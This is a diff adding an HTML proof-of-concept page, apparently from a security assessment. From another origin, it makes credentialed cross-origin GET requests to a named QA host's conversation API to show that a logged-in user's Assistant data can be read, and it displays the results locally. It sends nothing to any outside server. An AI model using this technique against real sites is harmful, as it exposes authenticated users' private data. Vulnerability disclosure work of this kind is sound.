@@ -1,0 +1,121 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>R-09 Merlin QA CORS read PoC</title>
+  <style>
+    body { font: 16px/1.5 system-ui, sans-serif; max-width: 900px; margin: 2rem auto; padding: 0 1rem; color: #17212b; }
+    label { display: block; margin: 1rem 0; }
+    input { display: block; box-sizing: border-box; width: 100%; padding: .55rem; font: inherit; }
+    button { padding: .6rem 1rem; font: inherit; cursor: pointer; }
+    pre { white-space: pre-wrap; overflow-wrap: anywhere; background: #f2f4f7; padding: 1rem; border-radius: 6px; }
+    .note { color: #495360; }
+  </style>
+</head>
+<body>
+  <h1>R-09: cross-origin Assistant read</h1>
+  <p class="note">Log in to the Merlin QA instance in this browser profile first. Serve this file from a different origin, such as localhost. This page sends only read-only GET requests to the QA instance and displays results locally.</p>
+  <p><strong>PoC origin:</strong> <span id="origin"></span></p>
+  <form id="poc">
+    <label>Conversation ID (optional; blank selects the first item in your list)
+      <input id="conversation" autocomplete="off" placeholder="co_...">
+    </label>
+    <label>Message ID (optional; blank selects the first message in that conversation)
+      <input id="message" autocomplete="off" placeholder="qt_...">
+    </label>
+    <button id="run" type="submit">Read my Assistant data</button>
+    <button id="clear" type="button">Clear results</button>
+  </form>
+  <h2>Result</h2>
+  <pre id="result" aria-live="polite">Ready.</pre>
+  <details>
+    <summary>Show response JSON in this browser</summary>
+    <pre id="raw">No response yet.</pre>
+  </details>
+  <p class="note">The page makes no request to a collection server. Browser third-party-cookie settings can prevent the QA cookie from being sent; a failed fetch in that case does not establish that the server's CORS policy is safe.</p>
+  <script>
+    "use strict";
+    const api = "https://cr-den-qa2-cobalt-testing-ista-stb-1.qa.den.medallia.com/api-comp/reporting/service/athena-studio/v3/conversations/";
+    const result = document.getElementById("result");
+    const raw = document.getElementById("raw");
+    document.getElementById("origin").textContent = location.origin;
+
+    async function readJson(url) {
+      const response = await fetch(url, {
+        method: "GET",
+        mode: "cors",
+        credentials: "include",
+        cache: "no-store"
+      });
+      const body = await response.json();
+      return { status: response.status, body: body };
+    }
+
+    document.getElementById("poc").addEventListener("submit", async function (event) {
+      event.preventDefault();
+      const button = document.getElementById("run");
+      button.disabled = true;
+      result.textContent = "Requesting Assistant data from " + location.origin + "...";
+      raw.textContent = "Waiting.";
+      const captured = {};
+      try {
+        captured.list = await readJson(api + "?page=1");
+        const items = Array.isArray(captured.list.body.conversations)
+          ? captured.list.body.conversations : [];
+        let conversationId = document.getElementById("conversation").value.trim();
+        if (!conversationId && items.length) conversationId = items[0].hashed_id || "";
+        if (conversationId && !/^co_[A-Za-z0-9]+$/.test(conversationId)) {
+          throw new Error("Enter a conversation ID in co_... format.");
+        }
+        let messageId = document.getElementById("message").value.trim();
+        if (messageId && !/^qt_[A-Za-z0-9]+$/.test(messageId)) {
+          throw new Error("Enter a message ID in qt_... format.");
+        }
+        if (conversationId) {
+          captured.conversation = await readJson(api + conversationId + "/");
+          if (!messageId) {
+            const messages = captured.conversation.body.conversation?.messages || [];
+            messageId = messages[0]?.hashed_id || "";
+          }
+        }
+        if (conversationId && messageId) {
+          captured.message = await readJson(api + conversationId + "/messages/" + messageId + "/");
+        }
+        const message = captured.message?.body.message || {};
+        const answer = (message.answer_fragments || [])
+          .filter(function (fragment) {
+            return fragment.fragment_type === "text-answer-fragment" && fragment.purpose === "general";
+          })
+          .map(function (fragment) { return String(fragment.text?.body || ""); })
+          .join("\n");
+        result.textContent = [
+          "Page origin: " + location.origin,
+          "List: HTTP " + captured.list.status + ", " + items.length + " conversations readable",
+          "Conversation: " + (conversationId || "none") +
+            (captured.conversation ? ", HTTP " + captured.conversation.status : ""),
+          "Message: " + (messageId || "none") +
+            (captured.message ? ", HTTP " + captured.message.status : ""),
+          "Answer status: " + (message.answer_status || "none"),
+          "Answer length: " + answer.length + " characters",
+          "",
+          "If the list and message show HTTP 200 here, this unrelated page read authenticated QA JSON."
+        ].join("\n");
+        raw.textContent = JSON.stringify(captured, null, 2);
+      } catch (error) {
+        result.textContent = "Cross-origin read failed in this browser: " +
+          String(error?.message || error) +
+          "\nCheck that the QA login is active in this browser profile and that it sends third-party cookies.";
+        raw.textContent = JSON.stringify(captured, null, 2);
+      } finally {
+        button.disabled = false;
+      }
+    });
+
+    document.getElementById("clear").addEventListener("click", function () {
+      result.textContent = "Ready.";
+      raw.textContent = "No response yet.";
+    });
+  </script>
+</body>
+</html>
